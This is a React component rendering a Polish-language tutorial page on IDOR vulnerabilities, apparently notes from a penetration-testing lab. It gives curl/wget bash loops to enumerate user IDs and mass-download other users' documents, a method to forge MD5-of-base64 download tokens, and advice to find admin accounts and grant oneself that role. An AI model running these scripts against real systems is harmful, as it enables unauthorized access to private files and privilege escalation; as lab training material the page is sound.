import idor_enumeration from '../../../assets/idor_enumeration.png';
import idor_check from '../../../assets/idor_check.png';
import idor_download from '../../../assets/idor_download.png';
import idor_enumeration_user from '../../../assets/idor_enumeration_user.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const IDOR = () =>{
    return(
        <section>
            <h1>IDOR (Insecure Direct Object References)</h1>
            <h2>IDOR Enumeracja plików</h2>

            <ExampleFrame screen={idor_enumeration} />

            <p>Sprawdzając nazwy możemy zauważyć że są one tworzone wg schematu (zawiera uid oraz miesąc z rokiem)</p>

            <p className='important'>/documents/Invoice_1_09_2021.pdf</p>
            <p className='important'>/documents/Report_1_10_2021.pdf</p>

            <p>Zbadajmy element na stronie by móc go wykorzystać przy zapytaniu <span className='important'>cURL</span></p>
            <ExampleFrame screen={idor_check} />

            <div className='waring'>
                <p>Wycinamy teraz z wyniku same nazwy .pdf</p>
                <span className='important'>curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"</span>
            </div>

            <div className='waring'>
                <p>#!/bin/bash</p>
                <p>url="http://SERVER_IP:PORT"</p>
                <p>for i in {`{1..10}`}; do</p>
                <p className='tab-1'>for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do</p>
                <p className='tab-2'>wget -q $url/$link</p>
                <p className='tab-1'>done</p>
                <p>done</p>
            </div>

            <ExampleFrame screen={idor_download} />

            <p>Często plik może być zaszyfrowany <span className='important'>(one-way)</span> co oznacza że nie może zostać odzszyfrowany, jednak możemy wykonać próby szyfrowania by otrzymać taką samą wartość wykorzystując do tego <span className='important'>(uid, username, filename)</span></p>
            
            <div className='waring'>
                <p>Ponieważ większość nowoczesnych aplikacji internetowych jest tworzona przy użyciu <span className='important'>frameworków JavaScript, takich jak Angular, React czy Vue.js</span>, wielu twórców stron internetowych może popełnić błąd, wykonując wrażliwe funkcje w interfejsie, co naraziłoby je na ataki. Na przykład, jeśli powyższy skrót był obliczany na interfejsie użytkownika, możemy przestudiować funkcję, a następnie odtworzyć jej działanie, aby obliczyć ten sam skrót. Na szczęście dla nas tak właśnie jest w przypadku tej aplikacji internetowej. <span className='important'>Jeśli przyjrzymy się linkowi w kodzie źródłowym, zobaczymy, że wywołuje on funkcję JavaScript z <span className='error'>javascript:downloadContract('1')</span>. Patrząc na funkcję <span className='error'>downloadContract()</span> w kodzie źródłowym</span>, widzimy, co następuje</p>
                <p className='important'>function downloadContract(uid) {`{`}</p>
                <p className='important tab-1'>$.redirect("/download.php", {`{`}</p>
                <p className='important tab-2'>contract: CryptoJS.MD5(btoa(uid)).toString(),</p>
                <p className='important tab-1'>{`}`}, "POST", "_self");</p>
                <p className='important'>{`}`}</p>
            </div>

            <div className='waring'>
                    <p>echo -n 1 | base64 -w 0 | md5sum</p>
                    <p className='important'>cdd96d3cc73d1dbdaffa03cc6cd7339b</p>
            </div>

            <p>Otrzymujemy ten sam zaszyfrowany ciąg znaków, teraz możemy pobrać resztę plików innych użytkowników</p>

            <h3>Masowa enumeracja szyfrów</h3>

            <div className='waring'>
                <p>for i in {`{1..10}`}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done</p>

                <span className='important'>cdd96d3cc73d1dbdaffa03cc6cd7339b</span>
                <p></p>
                <span className='important'>0b7e7dee87b1c3b98e72131173dfbbbf</span>
                <p></p>
                <span className='important'>0b24df25fe628797b3a50ae0724d2730</span>
                <p></p>
                <span className='important'>f7947d50da7a043693a592b4db43b0a1</span>
                <p></p>
                <span className='important'>8b9af1f7f76daf0f02bd9c48c4a2e3d0</span>
                <p></p>
                <span className='important'>006d1236aee3f92b8322299796ba1989</span>
                <p></p>
                <span className='important'>...</span>
            </div>

            <p>Następnie możemy zautomatyzować pobieranie plików</p>

            <div className='waring'>
                <p>#!/bin/bash</p>
                <p>for i in {`{1..10}`}; do</p>
                <p className='tab-1'>for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do</p>
                <p className='tab-2'> curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php</p>
                <p className='tab-1'>done</p>
                <p>done</p>
            </div>

            <hr />

            <h2>Enumeracja użytkowników</h2>

            <ExampleFrame screen={idor_enumeration_user} />

            <p>Aplikacja zawiera inną lukę którą możemy wykorzystać. Zmieniając id użytkownika w linku, możemy otrzymać dane użytkownika w tym role</p>
            <p>Możemy sprawdzić wszystkicyh użytkowników i poszukać z uprawnienami admin, by sobie ją przypisać w edycji profilu</p>
        
        </section>
    )
}

export default IDOR;